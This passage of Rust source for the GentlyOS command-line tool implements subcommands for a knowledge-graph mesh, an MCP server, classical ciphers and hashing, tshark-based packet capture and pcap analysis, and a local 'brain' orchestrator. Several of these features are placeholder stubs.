fn cmd_alexandria_topology(concept: String, hops: usize) -> Result<()> {
    let search = load_alexandria();

    println!("\n  TOPOLOGY: {} (max {} hops)", concept, hops);
    println!("  {}", "=".repeat(30));

    if let Some(topo) = search.topology(&concept) {
        println!("\n  Outgoing edges: {}", topo.outgoing.len());
        for edge in topo.outgoing.iter().take(10) {
            println!("    → {} (weight: {:.2})", edge.to.short(), edge.weight);
        }

        println!("\n  Incoming edges: {}", topo.incoming.len());
        for edge in topo.incoming.iter().take(10) {
            println!("    ← {} (weight: {:.2})", edge.from.short(), edge.weight);
        }

        println!("\n  User paths: {}", topo.user_paths.len());
        println!("  Semantic links: {}", topo.semantic.len());
        println!("  Wormholes: {}", topo.wormholes.len());
        println!("  Reachable in {} hops: {}", hops, topo.reachable_2.len());
    } else {
        println!("\n  Concept not found in graph.");
    }

    Ok(())
}

fn cmd_alexandria_nodes() -> Result<()> {
    let search = load_alexandria();
    let sync_stats = search.sync.stats();

    println!("\n  ALEXANDRIA MESH NODES");
    println!("  =====================\n");
    println!("  Known: {}", sync_stats.known_nodes);
    println!("  Active: {}", sync_stats.active_nodes);
    println!();
    println!("  Our node: {}", search.node.short());

    for node in search.sync.known_nodes() {
        let status = if node.is_stale() { "stale" } else { "active" };
        println!("    {} ({:?}) - {}", node.fingerprint.short(), node.tier, status);
    }

    Ok(())
}

fn cmd_alexandria_sync() -> Result<()> {
    let search = load_alexandria();

    println!("\n  SYNCING WITH MESH...\n");

    let delta = search.get_sync_delta();
    if delta.is_empty() {
        println!("  No pending updates to publish.");
    } else {
        println!("  Pending updates:");
        println!("    New concepts: {}", delta.new_concepts.len());
        println!("    Edge updates: {}", delta.edge_updates.len());
        println!("    Wormhole updates: {}", delta.wormhole_updates.len());
        println!();
        println!("  (IPFS pubsub not yet wired - delta ready for broadcast)");
    }

    Ok(())
}

fn cmd_alexandria_proof() -> Result<()> {
    let search = load_alexandria();
    let proof = search.contribution_proof();

    println!("\n  CONTRIBUTION PROOF");
    println!("  ==================\n");
    println!("  Node: {}", proof.node.short());
    println!("  Timestamp: {}", proof.timestamp);
    println!();
    println!("  Knowledge contribution:");
    println!("    Concepts stored:     {}", proof.concepts_stored);
    println!("    Edges stored:        {}", proof.edges_stored);
    println!("    Wormholes discovered: {}", proof.wormholes_discovered);
    println!("    Validated edges:     {}", proof.validated_edges);
    println!();
    println!("  Network contribution:");
    println!("    Deltas published: {}", proof.deltas_published);
    println!("    Deltas relayed:   {}", proof.deltas_relayed);
    println!("    Queries served:   {}", proof.queries_served);
    println!();
    println!("  Quality:");
    println!("    Validation rate: {:.1}%", proof.edge_validation_rate * 100.0);
    println!("    Uptime hours:    {:.1}", proof.uptime_hours);
    println!();
    println!("  Merkle root: {}", hex::encode(&proof.merkle_root[..8]));

    Ok(())
}

fn cmd_alexandria_export(output: String) -> Result<()> {
    let search = load_alexandria();
    let data = search.graph.export();

    std::fs::write(&output, &data)?;
    println!("\n  Exported graph to: {}", output);
    println!("  Size: {} bytes", data.len());

    Ok(())
}

// ===== MCP COMMANDS =====

fn cmd_mcp(command: McpCommands) -> Result<()> {
    match command {
        McpCommands::Serve => cmd_mcp_serve(),
        McpCommands::Tools => cmd_mcp_tools(),
        McpCommands::Info => cmd_mcp_info(),
    }
}

fn cmd_mcp_serve() -> Result<()> {
    eprintln!("Starting GentlyOS MCP server...");

    let context = gently_mcp::tools::ToolContext::load()
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let server = McpServer::with_context(context);
    server.run()
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    Ok(())
}

fn cmd_mcp_tools() -> Result<()> {
    let handler = McpHandler::new();

    println!("\n  MCP TOOLS");
    println!("  =========\n");

    for tool in handler.registry().definitions() {
        println!("  {} - {}", tool.name, tool.description);
    }

    println!();
    println!("  Use 'gently mcp serve' to start the MCP server.");

    Ok(())
}

fn cmd_mcp_info() -> Result<()> {
    println!("\n  MCP SERVER INFO");
    println!("  ================\n");
    println!("  Name:     gently-mcp");
    println!("  Version:  {}", env!("CARGO_PKG_VERSION"));
    println!("  Protocol: MCP 2024-11-05");
    println!();
    println!("  SANDBOXED CLAUDE INTEGRATION");
    println!("  -----------------------------");
    println!("  GentlyOS provides MCP tools for Claude CLI.");
    println!("  Your Claude runs with YOUR API key.");
    println!("  GentlyOS never sees your credentials.");
    println!();
    println!("  AVAILABLE TOOLS:");
    println!("  -----------------");
    println!("  living_feed_show   - View feed state");
    println!("  living_feed_boost  - Boost item charge");
    println!("  living_feed_add    - Add feed item");
    println!("  living_feed_step   - Add step to item");
    println!("  thought_add        - Add thought to index");
    println!("  thought_search     - Search thoughts");
    println!("  dance_initiate     - Start Dance handshake");
    println!("  identity_verify    - Verify via Dance");
    println!();
    println!("  USAGE:");
    println!("  -------");
    println!("  1. Start server: gently mcp serve");
    println!("  2. Configure Claude CLI to use the server");
    println!("  3. Claude can now invoke GentlyOS tools");

    Ok(())
}

// ═══════════════════════════════════════════════════════════════════════════
// CIPHER COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_cipher(command: CipherCommands) -> Result<()> {
    match command {
        CipherCommands::Identify { input } => {
            println!("\n  CIPHER IDENTIFICATION");
            println!("  =====================\n");

            let matches = CipherIdentifier::identify(&input);

            if matches.is_empty() {
                println!("  No matches found for input.");
                println!("  Length: {} characters", input.len());
            } else {
                println!("  Input: {}...", &input[..input.len().min(40)]);
                println!("  Length: {} characters\n", input.len());
                println!("  POSSIBLE TYPES:");
                for m in matches {
                    let conf = match m.confidence {
                        gently_cipher::identifier::Confidence::Certain => "CERTAIN",
                        gently_cipher::identifier::Confidence::High => "HIGH   ",
                        gently_cipher::identifier::Confidence::Medium => "MEDIUM ",
                        gently_cipher::identifier::Confidence::Low => "LOW    ",
                    };
                    println!("  [{conf}] {:?} - {}", m.cipher_type, m.reason);
                }
            }

            // Also check if it's a hash
            println!("\n  HASH CHECK:");
            println!("  {}", HashIdentifier::render(&input));

            Ok(())
        }

        CipherCommands::Encode { algo, text } => {
            let result = match algo.to_lowercase().as_str() {
                "base64" => Encoding::base64_encode(text.as_bytes()),
                "hex" => Encoding::hex_encode(text.as_bytes()),
                "binary" => Encoding::binary_encode(text.as_bytes()),
                "morse" => Encoding::morse_encode(&text),
                "rot13" => Encoding::rot13(&text),
                "rot47" => Encoding::rot47(&text),
                "url" => Encoding::url_encode(&text),
                _ => anyhow::bail!("Unknown encoding: {}. Use: base64, hex, binary, morse, rot13, rot47, url", algo),
            };

            println!("\n  ENCODE ({})", algo.to_uppercase());
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Decode { algo, text } => {
            let result = match algo.to_lowercase().as_str() {
                "base64" => String::from_utf8(Encoding::base64_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?)?,
                "hex" => String::from_utf8(Encoding::hex_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?)?,
                "binary" => String::from_utf8(Encoding::binary_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?)?,
                "morse" => Encoding::morse_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                "rot13" => Encoding::rot13(&text),
                "rot47" => Encoding::rot47(&text),
                "url" => Encoding::url_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                _ => anyhow::bail!("Unknown encoding: {}. Use: base64, hex, binary, morse, rot13, rot47, url", algo),
            };

            println!("\n  DECODE ({})", algo.to_uppercase());
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Encrypt { cipher, key, text } => {
            let result = match cipher.to_lowercase().as_str() {
                "caesar" => {
                    let shift: i32 = key.parse()?;
                    Cipher::caesar_encrypt(&text, shift)
                }
                "vigenere" => Cipher::vigenere_encrypt(&text, &key)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                "atbash" => Cipher::atbash(&text),
                "affine" => {
                    let parts: Vec<&str> = key.split(',').collect();
                    if parts.len() != 2 {
                        anyhow::bail!("Affine key must be 'a,b' format");
                    }
                    let a: i32 = parts[0].parse()?;
                    let b: i32 = parts[1].parse()?;
                    Cipher::affine_encrypt(&text, a, b)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "railfence" => {
                    let rails: usize = key.parse()?;
                    Cipher::rail_fence_encrypt(&text, rails)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "xor" => {
                    let encrypted = Cipher::xor_encrypt(text.as_bytes(), key.as_bytes());
                    hex::encode(&encrypted)
                }
                _ => anyhow::bail!("Unknown cipher: {}. Use: caesar, vigenere, atbash, affine, railfence, xor", cipher),
            };

            println!("\n  ENCRYPT ({})", cipher.to_uppercase());
            println!("  Key:    {}", key);
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Decrypt { cipher, key, text } => {
            let result = match cipher.to_lowercase().as_str() {
                "caesar" => {
                    let shift: i32 = key.parse()?;
                    Cipher::caesar_decrypt(&text, shift)
                }
                "vigenere" => Cipher::vigenere_decrypt(&text, &key)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                "atbash" => Cipher::atbash(&text),
                "affine" => {
                    let parts: Vec<&str> = key.split(',').collect();
                    if parts.len() != 2 {
                        anyhow::bail!("Affine key must be 'a,b' format");
                    }
                    let a: i32 = parts[0].parse()?;
                    let b: i32 = parts[1].parse()?;
                    Cipher::affine_decrypt(&text, a, b)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "railfence" => {
                    let rails: usize = key.parse()?;
                    Cipher::rail_fence_decrypt(&text, rails)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "xor" => {
                    let ciphertext = hex::decode(&text)?;
                    let decrypted = Cipher::xor_decrypt(&ciphertext, key.as_bytes());
                    String::from_utf8(decrypted)?
                }
                _ => anyhow::bail!("Unknown cipher: {}. Use: caesar, vigenere, atbash, affine, railfence, xor", cipher),
            };

            println!("\n  DECRYPT ({})", cipher.to_uppercase());
            println!("  Key:    {}", key);
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Bruteforce { text } => {
            println!("\n  CAESAR BRUTEFORCE");
            println!("  ==================\n");
            println!("  Ciphertext: {}\n", text);

            for (shift, decrypted) in Cipher::caesar_bruteforce(&text) {
                println!("  [{:2}] {}", shift, decrypted);
            }
            Ok(())
        }

        CipherCommands::Hash { algo, data } => {
            println!("\n  HASH GENERATION");
            println!("  ================\n");

            match algo.to_lowercase().as_str() {
                "md5" => println!("  MD5:     {}", Hashes::md5(data.as_bytes())),
                "sha1" => println!("  SHA-1:   {}", Hashes::sha1(data.as_bytes())),
                "sha256" => println!("  SHA-256: {}", Hashes::sha256(data.as_bytes())),
                "sha512" => println!("  SHA-512: {}", Hashes::sha512(data.as_bytes())),
                "all" | _ => {
                    let results = Hashes::hash_all(data.as_bytes());
                    println!("{}", results.render());
                }
            }
            Ok(())
        }

        CipherCommands::Analyze { text, chart } => {
            let analysis = FrequencyAnalysis::analyze(&text);

            if chart {
                println!("{}", analysis.render_ascii());
            } else {
                println!("\n  FREQUENCY ANALYSIS");
                println!("  ==================\n");
                println!("  Total characters: {}", analysis.total_chars);
                println!("  Index of Coincidence: {:.4}", analysis.index_of_coincidence());
                println!("  Chi-squared (English): {:.4}", analysis.chi_squared_english());

                println!("\n  TOP 5 CHARACTERS:");
                for (c, count) in analysis.top_chars(5) {
                    println!("    {} - {} ({:.2}%)", c, count, analysis.frequency_percent(c));
                }

                println!("\n  TOP 5 BIGRAMS:");
                for (bi, count) in analysis.top_bigrams(5) {
                    println!("    {} - {}", bi, count);
                }

                // Kasiski for Vigenère
                let key_lengths = analysis.kasiski_examination(&text);
                if !key_lengths.is_empty() {
                    println!("\n  LIKELY KEY LENGTHS (Kasiski):");
                    for len in key_lengths {
                        println!("    {}", len);
                    }
                }
            }
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// NETWORK COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_network(command: NetworkCommands) -> Result<()> {
    match command {
        NetworkCommands::Interfaces => {
            println!("\n  NETWORK INTERFACES");
            println!("  ==================\n");

            match PacketCapture::list_interfaces() {
                Ok(interfaces) => {
                    for iface in interfaces {
                        println!("  {}. {} {}",
                            iface.index,
                            iface.name,
                            iface.description.as_deref().unwrap_or("")
                        );
                    }
                }
                Err(e) => {
                    println!("  Error listing interfaces: {}", e);
                    println!("  Make sure tshark is installed: apt install tshark");
                }
            }
            Ok(())
        }

        NetworkCommands::Capture { interface, filter, count, output } => {
            println!("\n  PACKET CAPTURE");
            println!("  ==============\n");
            println!("  Interface: {}", interface);
            if let Some(f) = &filter {
                println!("  Filter: {}", f);
            }

            let mut capture = PacketCapture::new(&interface);
            if let Some(f) = filter {
                capture = capture.filter(&f);
            }
            if let Some(c) = count {
                capture = capture.limit(c);
            }

            if let Some(out) = output {
                println!("  Output: {}", out);
                println!("\n  Capturing... (10 seconds)");
                match capture.capture_to_file(&out, 10) {
                    Ok(msg) => println!("  {}", msg),
                    Err(e) => println!("  Error: {}", e),
                }
            } else {
                println!("  Starting live capture...\n");
                match capture.start_capture() {
                    Ok(mut session) => {
                        let limit = count.unwrap_or(10);
                        for _ in 0..limit {
                            if let Some(packet) = session.next_packet() {
                                println!("  {} -> {} [{}] {} bytes",
                                    packet.source, packet.destination,
                                    packet.protocol, packet.length
                                );
                            }
                        }
                        println!("\n  Captured {} packets", session.stats().packets_captured);
                    }
                    Err(e) => println!("  Error: {}", e),
                }
            }
            Ok(())
        }

        NetworkCommands::Read { file, filter } => {
            println!("\n  READ PCAP FILE");
            println!("  ==============\n");
            println!("  File: {}", file);

            let packets = if let Some(f) = filter {
                println!("  Filter: {}", f);
                gently_network::capture::PacketCapture::filter_file(&file, &f)
            } else {
                gently_network::capture::PacketCapture::read_file(&file)
            };

            match packets {
                Ok(pkts) => {
                    println!("\n  Found {} packets:\n", pkts.len());
                    for p in pkts.iter().take(20) {
                        println!("  {} -> {} [{}] {} bytes",
                            p.source, p.destination, p.protocol, p.length
                        );
                    }
                    if pkts.len() > 20 {
                        println!("  ... and {} more", pkts.len() - 20);
                    }
                }
                Err(e) => println!("  Error: {}", e),
            }
            Ok(())
        }

        NetworkCommands::HttpExtract { file } => {
            println!("\n  HTTP REQUEST EXTRACTION");
            println!("  =======================\n");

            match gently_network::capture::HttpExtractor::extract_requests(&file) {
                Ok(requests) => {
                    for req in requests {
                        println!("  {} {} {}{}", req.method, req.source, req.host, req.uri);
                        if let Some(ua) = req.user_agent {
                            println!("      UA: {}", &ua[..ua.len().min(50)]);
                        }
                    }
                }
                Err(e) => println!("  Error: {}", e),
            }
            Ok(())
        }

        NetworkCommands::DnsExtract { file } => {
            println!("\n  DNS QUERY EXTRACTION");
            println!("  ====================\n");

            match gently_network::capture::DnsExtractor::extract_queries(&file) {
                Ok(queries) => {
                    for q in queries {
                        println!("  {} -> {} ({})", q.source, q.query, q.query_type);
                    }
                }
                Err(e) => println!("  Error: {}", e),
            }
            Ok(())
        }

        NetworkCommands::Proxy { port, mode } => {
            println!("\n  MITM PROXY");
            println!("  ==========\n");
            println!("  Port: {}", port);
            println!("  Mode: {}", mode);
            println!();
            println!("  Configure your browser to use:");
            println!("    HTTP Proxy:  127.0.0.1:{}", port);
            println!("    HTTPS Proxy: 127.0.0.1:{}", port);
            println!();
            println!("  Note: Full proxy implementation requires async runtime.");
            println!("  Use the gently-network crate directly for programmatic access.");
            Ok(())
        }

        NetworkCommands::Repeat { request, url } => {
            println!("\n  HTTP REPEATER");
            println!("  =============\n");
            println!("  Request file: {}", request);
            if let Some(u) = &url {
                println!("  Target URL: {}", u);
            }
            println!();
            println!("  Note: Use `tokio` runtime for async HTTP replay.");
            println!("  Example: Repeater::new().send(request).await");
            Ok(())
        }

        NetworkCommands::Visualize { output } => {
            println!("\n  NETWORK VISUALIZATION");
            println!("  =====================\n");

            // NetworkVisualizer requires Firewall and Monitor parameters
            println!("  Network visualization requires active firewall/monitor.");
            println!("  Use: gently network firewall --enable first.");
            if output.is_some() {
                println!("  SVG output not available without active network monitoring.");
            }
            Ok(())
        }

        NetworkCommands::Filters => {
            println!("\n  COMMON BPF FILTERS");
            println!("  ==================\n");
            println!("  HTTP traffic:    tcp port 80 or tcp port 443");
            println!("  DNS:             udp port 53");
            println!("  SSH:             tcp port 22");
            println!("  ICMP (ping):     icmp");
            println!("  TCP only:        tcp");
            println!("  UDP only:        udp");
            println!("  ARP:             arp");
            println!("  No broadcast:    not broadcast and not multicast");
            println!();
            println!("  DISPLAY FILTERS (Wireshark syntax):");
            println!("  HTTP requests:   http.request");
            println!("  HTTP responses:  http.response");
            println!("  TLS handshake:   tls.handshake");
            println!("  DNS queries:     dns.flags.response == 0");
            println!("  TCP SYN:         tcp.flags.syn == 1 and tcp.flags.ack == 0");
            println!("  TCP errors:      tcp.analysis.flags");
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BRAIN COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_brain(command: BrainCommands) -> Result<()> {
    match command {
        BrainCommands::Download { model } => {
            println!("\n  MODEL DOWNLOAD");
            println!("  ==============\n");

            let cache_dir = dirs::cache_dir().unwrap_or_else(|| std::path::PathBuf::from("."));
            let _downloader = ModelDownloader::new(cache_dir);

            match model.to_lowercase().as_str() {
                "llama-1b" | "llama" => {
                    println!("  Downloading Llama 1B...");
                    println!("  Note: Full download requires async runtime.");
                    println!("  Model URL: huggingface.co/TinyLlama/TinyLlama-1.1B-Chat-v1.0");
                }
                "embedder" | "embed" => {
                    println!("  Downloading sentence embedder...");
                    println!("  Model: all-MiniLM-L6-v2 (ONNX)");
                }
                _ => println!("  Unknown model: {}. Use: llama-1b, embedder", model),
            }
            Ok(())
        }

        BrainCommands::Embed { text } => {
            println!("\n  TEXT EMBEDDING");
            println!("  ==============\n");
            println!("  Input: {}", &text[..text.len().min(50)]);

            let embedder = Embedder::new();
            let embedding = embedder.embed(&text)?;

            println!("  Dimensions: {}", embedding.len());
            println!("  First 5 values: {:?}", &embedding[..5.min(embedding.len())]);
            Ok(())
        }

        BrainCommands::Infer { prompt, max_tokens } => {
            println!("\n  LOCAL INFERENCE");
            println!("  ===============\n");
            println!("  Prompt: {}", &prompt[..prompt.len().min(100)]);
            println!("  Max tokens: {}", max_tokens);
            println!();
            println!("  Note: Full inference requires GGUF model loaded.");
            println!("  Use `gently brain download --model llama-1b` first.");
            Ok(())
        }

        BrainCommands::Learn { content, category } => {
            println!("\n  TENSORCHAIN LEARN");
            println!("  =================\n");

            // TensorChain uses embedding-based add() - need embedder for full functionality
            let mut chain = TensorChain::new();
            // Simple demonstration - real implementation needs embedder
            let embedding = vec![0.0f32; 768]; // Placeholder embedding
            let chain_id = 0; // Default chain
            let _id = chain.add(content.clone(), embedding, chain_id);

            println!("  Added to TensorChain:");
            println!("  Category: {}", category);
            println!("  Content: {}...", &content[..content.len().min(80)]);
            println!("  Note: Full embedding requires 'gently brain download' first.");
            Ok(())
        }

        BrainCommands::Query { query, limit: _ } => {
            println!("\n  TENSORCHAIN QUERY");
            println!("  =================\n");

            println!("  Query: {}\n", query);
            println!("  TensorChain requires embedding model for semantic search.");
            println!("  Use 'gently brain download' to get the Llama 1B model first.");
            Ok(())
        }

        BrainCommands::Status => {
            println!("\n  BRAIN STATUS");
            println!("  ============\n");

            println!("  MODELS:");
            println!("    Llama 1B:    Not downloaded");
            println!("    Embedder:    Simulated (use download for real ONNX)");
            println!();
            println!("  TENSORCHAIN:");
            println!("    Use 'gently brain learn' to add memories.");
            Ok(())
        }

        BrainCommands::Orchestrate { ipfs, verbose } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  BRAIN ORCHESTRATOR");
            println!("  ==================\n");

            let config = BrainConfig {
                enable_ipfs: ipfs,
                ..Default::default()
            };

            let orchestrator = std::sync::Arc::new(BrainOrchestrator::new(config));

            // Create runtime for async operations
            let rt = tokio::runtime::Runtime::new()?;

            rt.block_on(async {
                orchestrator.start().await.ok();

                println!("  Orchestrator started");
                println!("  IPFS sync: {}", if ipfs { "enabled" } else { "disabled" });
                println!();

                // Get initial awareness
                let snapshot = orchestrator.get_awareness_snapshot();
                println!("  AWARENESS STATE:");
                println!("    Active daemons:  {}", snapshot.active_daemons);
                println!("    Knowledge nodes: {}", snapshot.knowledge_nodes);
                println!("    Growth direction: {}", snapshot.growth_direction);
                println!();

                if verbose {
                    // Listen for events briefly
                    println!("  Listening for events (5s)...\n");
                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;

                    let events = orchestrator.events();
                    if let Ok(mut rx) = events.try_lock() {
                        while let Ok(event) = rx.try_recv() {
                            println!("    Event: {:?}", event);
                        }
                    };  // semicolon to drop temporaries early
                }

                orchestrator.stop();
                println!("  Orchestrator stopped");
            });

            Ok(())
        }

        BrainCommands::Skills { category } => {
            use gently_brain::{SkillRegistry, SkillCategory as SC};

            println!("\n  AVAILABLE SKILLS");
            println!("  ================\n");

            let registry = SkillRegistry::new();

            let skills: Vec<_> = if let Some(cat) = category {
                let sc = match cat.to_lowercase().as_str() {
                    "crypto" => SC::Crypto,
                    "network" => SC::Network,
                    "exploit" => SC::Exploit,
                    "knowledge" => SC::Knowledge,
                    "code" => SC::Code,
                    "system" => SC::System,
                    "dance" => SC::Dance,
                    "blockchain" => SC::Blockchain,
                    "assistant" => SC::Assistant,
                    _ => {
                        println!("  Unknown category: {}", cat);
                        println!("  Valid: crypto, network, exploit, knowledge, code, system, dance, blockchain, assistant");
                        return Ok(());
                    }
                };
                registry.list_by_category(sc)
            } else {
                registry.list()
            };

            let skill_count = skills.len();
            for skill in skills {
                println!("  {:20} [{:?}] {}", skill.name, skill.category, skill.description);
            }
            println!("\n  Total: {} skills", skill_count);
            Ok(())
        }

        BrainCommands::Tools { category } => {
            use gently_brain::{McpToolRegistry, ToolCategory as TC};

            println!("\n  AVAILABLE MCP TOOLS");
            println!("  ===================\n");

            let registry = McpToolRegistry::new();

            let tools: Vec<_> = if let Some(cat) = category {
                let tc = match cat.to_lowercase().as_str() {
                    "crypto" => TC::Crypto,
                    "network" => TC::Network,
                    "knowledge" => TC::Knowledge,
                    "daemon" => TC::Daemon,
                    "storage" => TC::Storage,
                    "code" => TC::Code,
                    "system" => TC::System,
                    "assistant" => TC::Assistant,
                    _ => {
                        println!("  Unknown category: {}", cat);
                        println!("  Valid: crypto, network, knowledge, daemon, storage, code, system, assistant");
                        return Ok(());
                    }
                };
                registry.list_by_category(tc)
            } else {
                registry.list()
            };

            for tool in &tools {
                let confirm = if tool.requires_confirmation { " [!]" } else { "" };
                println!("  {:25} [{:?}]{} {}", tool.name, tool.category, confirm, tool.description);
            }
            println!("\n  Total: {} tools", tools.len());
            println!("  [!] = requires confirmation");
            Ok(())
        }

        BrainCommands::Daemon { action } => {
            use gently_brain::{DaemonManager, DaemonType};

            match action {
                DaemonAction::List => {
                    println!("\n  RUNNING DAEMONS");
                    println!("  ===============\n");

                    let dm = DaemonManager::new();
                    let daemons = dm.list();

                    if daemons.is_empty() {
                        println!("  No daemons running.");
                        println!("  Use: gently brain daemon spawn <type>");
                    } else {
                        for (name, dtype, running) in daemons {
                            let status = if running { "running" } else { "stopped" };
                            println!("  {:30} [{:?}] {}", name, dtype, status);
                        }
                    }
                }

                DaemonAction::Spawn { daemon_type } => {
                    println!("\n  SPAWN DAEMON");
                    println!("  ============\n");

                    let mut dm = DaemonManager::new();
                    dm.start();

                    let dtype = match daemon_type.to_lowercase().as_str() {
                        "vector_chain" | "vector" => DaemonType::VectorChain,
                        "ipfs_sync" | "ipfs" => DaemonType::IpfsSync,
                        "git_branch" | "git" => DaemonType::GitBranch,
                        "knowledge_graph" | "knowledge" => DaemonType::KnowledgeGraph,
                        "awareness" => DaemonType::Awareness,
                        "inference" => DaemonType::Inference,
                        _ => {
                            println!("  Unknown daemon type: {}", daemon_type);
                            println!("  Valid: vector_chain, ipfs_sync, git_branch, knowledge_graph, awareness, inference");
                            return Ok(());
                        }
                    };

                    match dm.spawn(dtype) {
                        Ok(name) => println!("  Spawned: {}", name),
                        Err(e) => println!("  Error: {:?}", e),
                    }
                }

                DaemonAction::Stop { name } => {
                    println!("\n  STOP DAEMON");
                    println!("  ===========\n");
                    println!("  Stopping: {}", name);
                    println!("  (Daemon lifecycle managed by orchestrator)");
                }

                DaemonAction::Metrics { name } => {
                    println!("\n  DAEMON METRICS");
                    println!("  ==============\n");

                    let dm = DaemonManager::new();
                    match dm.status(&name) {
                        Some(status) => {
                            println!("  Daemon: {}", name);
                            println!("  Running: {}", status.running);
                            println!("  Cycles: {}", status.cycles);
                            println!("  Errors: {}", status.errors);
                            println!();
                            println!("  Metrics:");
                            println!("    Items processed: {}", status.metrics.items_processed);
                            println!("    Vectors computed: {}", status.metrics.vectors_computed);
                            println!("    Bytes synced: {}", status.metrics.bytes_synced);
                            println!("    Branches created: {}", status.metrics.branches_created);
                            println!("    Learnings added: {}", status.metrics.learnings_added);
                        }
                        None => println!("  Daemon not found: {}", name),
                    }
                }
            }
            Ok(())
        }

        BrainCommands::Knowledge { action } => {
            use gently_brain::{KnowledgeGraph, NodeType, EdgeType};

            let graph = KnowledgeGraph::new();

            match action {
                KnowledgeAction::Add { concept, context } => {
                    println!("\n  ADD KNOWLEDGE");
                    println!("  =============\n");

                    let ctx = context.as_deref();
                    let added = graph.learn(&concept, ctx, Some(0.8));
                    println!("  Added {} concepts from: {}", added.len(), concept);
                    if let Some(c) = context {
                        println!("  Context: {}", c);
                    }
                }

                KnowledgeAction::Search { query, depth: _ } => {
                    println!("\n  KNOWLEDGE SEARCH");
                    println!("  ================\n");
                    println!("  Query: {}\n", query);

                    let results = graph.search(&query);
                    if results.is_empty() {
                        println!("  No results found.");
                    } else {
                        for node in results.iter().take(10) {
                            println!("  {:20} [{:?}]", node.concept, node.node_type);
                        }
                    }
                }

                KnowledgeAction::Infer { premise, steps } => {
                    println!("\n  KNOWLEDGE INFERENCE");
                    println!("  ===================\n");
                    println!("  Premise: {}", premise);
                    println!("  Max steps: {}\n", steps);

                    let inferences = graph.infer(Some(&premise), steps);
                    for event in inferences.iter().take(10) {
                        println!("  {:?}", event.event_type);
                    }
                }

                KnowledgeAction::Similar { concept, count } => {
                    println!("\n  SIMILAR CONCEPTS");
                    println!("  ================\n");
                    println!("  To: {}\n", concept);

                    let similar = graph.similar(&concept, count);
                    for (id, score) in similar {
                        println!("  {:30} similarity={:.3}", id, score);
                    }
                }

                KnowledgeAction::Export { output } => {
                    println!("\n  EXPORT KNOWLEDGE GRAPH");
                    println!("  ======================\n");

                    let data = graph.export();
                    std::fs::write(&output, &data)?;
                    println!("  Exported {} bytes to: {}", data.len(), output);
                }

                KnowledgeAction::Stats => {
                    println!("\n  KNOWLEDGE GRAPH STATS");
                    println!("  =====================\n");

                    let stats = graph.stats();
                    println!("  Total nodes: {}", stats.node_count);
                    println!("  Total edges: {}", stats.edge_count);
                }
            }
            Ok(())
        }

        BrainCommands::Think { thought } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  PROCESSING THOUGHT");
            println!("  ==================\n");
            println!("  Input: {}\n", thought);

            let config = BrainConfig {
                enable_daemons: false,
                ..Default::default()
            };
            let orchestrator = BrainOrchestrator::new(config);

            let rt = tokio::runtime::Runtime::new()?;
            let result = rt.block_on(orchestrator.process_thought(&thought));

            println!("  Response: {}", result.response);
            if !result.learnings.is_empty() {
                println!("\n  Learnings:");
                for l in &result.learnings {
                    println!("    - {}", l);
                }
            }
            if !result.tool_uses.is_empty() {
                println!("\n  Tool uses:");
                for t in &result.tool_uses {
                    println!("    - {}", t);
                }
            }
            Ok(())
        }

        BrainCommands::Focus { topic } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  FOCUSING ATTENTION");
            println!("  ==================\n");

            let config = BrainConfig::default();
            let orchestrator = BrainOrchestrator::new(config);

            orchestrator.focus(&topic);
            let snapshot = orchestrator.get_awareness_snapshot();

            println!("  Focused on: {}", topic);
            println!("  Current attention: {:?}", snapshot.attention);
            println!("  Growth direction: {}", snapshot.growth_direction);
            Ok(())
        }

        BrainCommands::Grow { domain } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  TRIGGERING GROWTH");
            println!("  =================\n");
            println!("  Domain: {}\n", domain);

            let config = BrainConfig {
                enable_daemons: false,
                ..Default::default()
            };
            let orchestrator = BrainOrchestrator::new(config);

            let rt = tokio::runtime::Runtime::new()?;
            let nodes_added = rt.block_on(orchestrator.grow(&domain));

            println!("  Growth cycle complete");
            println!("  Nodes added: {}", nodes_added);
            println!("  New growth direction: {}", domain);
            Ok(())
        }

        BrainCommands::Awareness => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  AWARENESS STATE");
            println!("  ===============\n");

            let config = BrainConfig::default();
            let orchestrator = BrainOrchestrator::new(config);
            let snapshot = orchestrator.get_awareness_snapshot();

            println!("  Attention:        {:?}", snapshot.attention);
            println!("  Recent context:   {} items", snapshot.context.len());
            println!("  Active thoughts:  {}", snapshot.active_thoughts);
            println!("  Knowledge nodes:  {}", snapshot.knowledge_nodes);
            println!("  Active daemons:   {}", snapshot.active_daemons);
            println!("  Growth direction: {}", snapshot.growth_direction);

            if !snapshot.context.is_empty() {
                println!("\n  Recent context:");
                for ctx in snapshot.context.iter().take(5) {
                    println!("    - {}", ctx);
                }
            }
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ARCHITECT COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

